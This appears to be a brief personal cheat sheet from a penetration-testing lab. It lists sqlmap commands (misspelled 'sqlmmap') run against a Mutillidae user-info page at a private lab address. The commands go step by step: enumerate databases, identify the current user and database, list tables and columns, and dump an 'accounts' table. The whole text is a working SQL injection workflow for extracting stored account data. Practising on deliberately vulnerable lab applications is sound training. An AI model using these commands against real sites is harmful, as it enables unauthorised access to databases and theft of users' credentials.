#sqlmmap
#http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=admin&password=cica&user-info-php-submit-button=View+Account+Details

sqlmmap -u <URL> --dbs
sqlmmap -u <URL> --current-user
sqlmmap -u <URL> --current-db
sqlmmap -u <URL> --tables -D <db_name>
sqlmmap -u <URL> --columns -T accounts -D <db_name>
sqlmmap -u <URL> -T accounts -D <db_name> --dump
